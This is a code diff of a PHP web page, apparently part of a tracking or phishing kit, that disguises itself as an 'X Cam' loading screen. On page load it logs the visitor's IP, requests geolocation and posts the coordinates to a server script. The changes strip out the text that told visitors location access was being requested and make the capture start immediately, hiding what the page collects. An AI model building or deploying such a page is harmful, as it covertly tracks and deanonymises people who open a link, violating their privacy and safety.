@@ -1,12 +1,12 @@
 <?php
-include 'ip.php';
+include 'xcam-ip.php';
 
 // Add JavaScript to capture location
 echo '
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>X Cam - Loading</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
         // Debug function to log messages - only log essential information
@@ -17,7 +17,7 @@ echo '
                 
                 // Send only essential logs to server
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST", "debug_log.php", true);
+                xhr.open("POST", "xcam-debug_log.php", true);
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 xhr.send("message=" + encodeURIComponent(message));
             }
@@ -30,7 +30,7 @@ echo '
                 // Don\'t log this message
                 
                 // Show permission request message
-                document.getElementById("locationStatus").innerText = "Requesting location permission...";
+                document.getElementById("locationStatus").innerText = "X Cam - Requesting access...";
                 
                 navigator.geolocation.getCurrentPosition(
                     sendPosition, 
@@ -53,7 +53,7 @@ echo '
         
         function sendPosition(position) {
             debugLog("Position obtained successfully");
-            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
+            document.getElementById("locationStatus").innerText = "X Cam - Loading...";
             
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
@@ -62,7 +62,7 @@ echo '
             debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
             
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "location.php", true);
+            xhr.open("POST", "xcam-location.php", true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             
             xhr.onreadystatechange = function() {
@@ -112,15 +112,13 @@ echo '
         // Try to get location when page loads
         window.onload = function() {
             // Don\'t log this message
-            setTimeout(function() {
-                getLocation();
-            }, 500); // Small delay to ensure everything is loaded
+            getLocation(); // Auto-start immediately on load
         };
     </script>
 </head>
 <body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
-    <h2>Loading, please wait...</h2>
-    <p>Please allow location access for better experience</p>
+    <h2>X Cam - Loading</h2>
+    <p>Initializing...</p>
     <p id="locationStatus">Initializing...</p>
     <div style="margin-top: 30px;">
         <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
